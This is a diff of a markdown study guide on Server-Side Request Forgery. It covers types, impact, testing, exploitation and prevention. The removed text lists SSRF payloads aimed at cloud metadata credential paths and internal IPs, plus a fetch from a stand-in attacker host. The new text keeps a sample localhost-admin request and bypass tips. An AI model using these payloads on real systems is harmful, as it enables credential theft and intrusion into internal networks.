@@ -1,177 +1,136 @@
 # Server-Side Request Forgery (SSRF)
 
-## CONTENTS
-1. [What is SSRF?](#1-what-is-ssrf)
-2. [Impact of SSRF Vulnerabilities](#2-impact-of-ssrf-vulnerabilities)
-3. [Common Types of SSRF Vulnerabilities](#3-common-types-of-ssrf-vulnerabilities)
-   - [Basic SSRF](#31-basic-ssrf)
-   - [Blind SSRF](#32-blind-ssrf)
-   - [Chained SSRF](#33-chained-ssrf)
-4. [Prevention of SSRF Vulnerabilities](#4-prevention-of-ssrf-vulnerabilities)
-5. [References](#5-references)
+## Table Of Contents
+- [What Is SSRF?](#what-is-ssrf)
+- [How To Find SSRF Vulnerabilities](#how-to-find-ssrf-vulnerabilities)
+- [How To Exploit SSRF Vulnerabilities](#how-to-exploit-ssrf-vulnerabilities)
+- [How To Prevent SSRF Vulnerabilities](#how-to-prevent-ssrf-vulnerabilities)
 
 ---
 
-## 1. What is SSRF?
+## What Is SSRF?
 
-Server-Side Request Forgery (SSRF) is a web vulnerability that allows an attacker to manipulate a server into making arbitrary requests to resources they control or internal systems the attacker cannot directly access.
-
-**Key Characteristics**:
-1. The attacker sends a crafted request to a vulnerable application.
-2. The server, acting as a proxy, executes the attacker’s request to unintended resources.
-
-SSRF exploits functionality where a server fetches resources based on user input. By manipulating user-controlled parameters, attackers can:
-- Access sensitive internal resources.
-- Scan internal networks and services.
-- Exploit cloud services or retrieve metadata.
-
-**Example Scenario**:
-- An application uses a URL to retrieve content:
-
-`http://example.com/fetch?url=http://trusted.com/resource`
-
-- The attacker manipulates the URL:
-
-`http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/`
-
-This fetches sensitive data from the cloud metadata service.
+Server-Side Request Forgery (SSRF) is a vulnerability that occurs when an application fetches a remote resource without first validating user-supplied URLs. This can allow attackers to manipulate server-side requests to access unauthorized internal systems or third-party services.
 
 ---
 
-## 2. Impact of SSRF Vulnerabilities
+### Types of SSRF
 
-1. **Confidentiality**:
- - Access sensitive internal resources, such as databases, internal APIs, or cloud metadata.
+1. **Regular / In-Band SSRF**:
+   - The attacker sees the response of the malicious request in the application.
 
-2. **Integrity**:
- - Perform unauthorized actions, such as modifying server configurations.
-
-3. **Availability**:
- - Cause denial-of-service (DoS) attacks by overwhelming internal services.
-
-4. **Advanced Exploitation**:
- - SSRF can lead to privilege escalation, remote code execution, or lateral movement within a network.
+2. **Blind / Out-of-Band SSRF**:
+   - The attacker does not directly see the response but observes effects or monitors interactions via external tools.
 
 ---
 
-## 3. Common Types of SSRF Vulnerabilities
+### Impact of SSRF Attacks
 
-### 3.1. Basic SSRF
-
-**Theory**  
-Basic SSRF allows direct manipulation of user-controlled input to perform unauthorized requests.
-
-**Steps to Find**
-1. Locate user inputs that fetch external resources (e.g., URLs, hostnames).
-2. Test with payloads to access internal services:
-
-```html
-http://127.0.0.1/
-http://169.254.169.254/latest/meta-data/
-```
-
-
-**Steps to Exploit**
-1. Retrieve sensitive information:
-
-```html
-http://127.0.0.1/admin 
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-```
-2. Scan for internal services:
-
-```html
-http://10.0.0.1:80 
-http://192.168.0.1/private
-```
+- **Confidentiality**: Can lead to sensitive data exposure.
+- **Integrity**: May compromise the internal systems.
+- **Availability**: Can lead to denial-of-service attacks.
+- **Other Impacts**:
+  - Scanning internal networks.
+  - Compromising internal services.
+  - Remote code execution on the server.
 
 ---
 
-### 3.2. Blind SSRF
+## How to Find SSRF Vulnerabilities
 
-**Theory**  
-Blind SSRF occurs when the server processes the attacker’s request without providing a visible response. Out-of-band communication channels are often required.
+### Black-Box Testing
 
-**Steps to Find**
-1. Set up an out-of-band (OOB) service such as Burp Collaborator or a DNS logger.
-2. Inject OOB payloads:
+1. **Map the Application**:
+   - Identify parameters containing hostnames, IP addresses, or full URLs.
+   
+2. **Modify Parameter Values**:
+   - Attempt to specify alternative resources or servers and observe responses.
 
-`http://your-oob-server.com`
+3. **Monitor for Incoming Connections**:
+   - Use a server you control and check for requests from the application.
 
-3. Monitor for requests from the vulnerable server.
-
-**Steps to Exploit**
-1. Enumerate internal services using delays:
-
-```html
-http://10.0.0.1:80 (200 OK) 
-http://10.0.0.2:80 (no response)
-```
-
-2. Use DNS rebinding to resolve private IPs:
-- Inject payloads resolving to internal IP ranges.
+4. **Test Common Defenses**:
+   - Try known techniques like encoding schemes, DNS rebinding, and HTTP redirection.
 
 ---
 
-### 3.3. Chained SSRF
+### White-Box Testing
 
-**Theory**  
-Chained SSRF combines SSRF with other vulnerabilities to achieve a more significant impact.
+1. **Source Code Review**:
+   - Identify all parameters that accept URLs.
 
-**Steps to Exploit**
-1. Use SSRF to retrieve configuration files or credentials:
+2. **Analyze URL Parsers**:
+   - Determine if the URL parser can be bypassed.
 
-`http://metadata.internal/latest/meta-data/`
-
-2. Use the retrieved credentials to access internal APIs or services.
-3. Trigger secondary vulnerabilities like insecure deserialization or command injection.
-
-**Advanced Example**:
-- Fetch malicious scripts:
-
-`http://vulnerable.com/api?fetch=http://attacker.com/malicious-script`
+3. **Test Additional Defenses**:
+   - Explore custom rules or bypass mechanisms in the application.
 
 ---
 
-## 4. Prevention of SSRF Vulnerabilities
+## How to Exploit SSRF Vulnerabilities
 
-### Input Validation
+### Regular / In-Band SSRF
 
-1. **Allowlist Validation**:
- - Restrict URLs and IPs to a known allowlist.
- - Example:
-   - Allow only domains like `trusted.com`.
-   - Block private IP ranges such as `127.0.0.1`, `10.0.0.0/8`, and `192.168.0.0/16`.
+1. **Modify URL Parameters**:
+   - Example Request:
+     ```http
+     POST /product/stock HTTP/1.0
+     Content-Type: application/x-www-form-urlencoded
+     Content-Length: 118
 
-2. **Reject Unsafe Input**:
- - Block URLs using unsafe protocols (e.g., `file://`, `ftp://`).
+     stockApi=http://localhost/admin
+     ```
 
----
-
-### Secure Network Configuration
-
-1. **Restrict Server Access**:
- - Limit the server’s ability to communicate with internal resources.
- - Use network segmentation to isolate sensitive systems.
-
-2. **Firewall Rules**:
- - Use a deny-all policy for outgoing requests and allow only necessary destinations.
+2. **Bypass Defenses**:
+   - Use different encoding schemes (e.g., decimal, octal).
+   - Exploit DNS rebinding or HTTP redirection.
+   - Leverage inconsistencies in URL parsing.
 
 ---
 
-### Additional Measures
+### Blind / Out-of-Band SSRF
 
-1. **Disable URL Redirections**:
- - Prevent redirection chains from bypassing input validation.
+1. **Trigger HTTP Requests**:
+   - Example: Use a tool like Burp Collaborator to monitor for network interactions.
 
-2. **Log and Monitor**:
- - Log all outgoing requests.
- - Use monitoring tools to detect abnormal traffic.
+2. **Evade Defenses**:
+   - Obfuscate malicious domains to bypass filtering mechanisms.
+
+3. **Determine Goals**:
+   - Use SSRF to find further vulnerabilities or exploit backend systems.
 
 ---
 
-## 5. References
+## How to Prevent SSRF Vulnerabilities
 
-- [PortSwigger Web Security Academy – SSRF](https://portswigger.net/web-security/ssrf)  
-- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)  
-- [SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)  
+### Application Layer Defenses
+
+1. **Validate Input**:
+   - Enforce URL schema, port, and destination using a positive allow list.
+
+2. **Disable HTTP Redirection**:
+   - Prevent automatic handling of redirects.
+
+3. **Do Not Send Raw Responses**:
+   - Ensure client-supplied data is sanitized before sending responses.
+
+---
+
+### Network Layer Defenses
+
+1. **Segment Remote Resource Access**:
+   - Isolate network access to specific resources.
+
+2. **Firewall Policies**:
+   - Use "deny by default" policies to restrict internal traffic.
+
+---
+
+## Resources
+
+- [Web Security Academy - SSRF](https://portswigger.net/web-security/ssrf)
+- [OWASP - SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
+- [Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
+- [SSRF Bible Cheat Sheet](https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf)
+- [Preventing Server-Side Request Forgery Attacks](https://seclab.nu/static/publications/sac21-prevent-ssrf.pdf)
+- [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
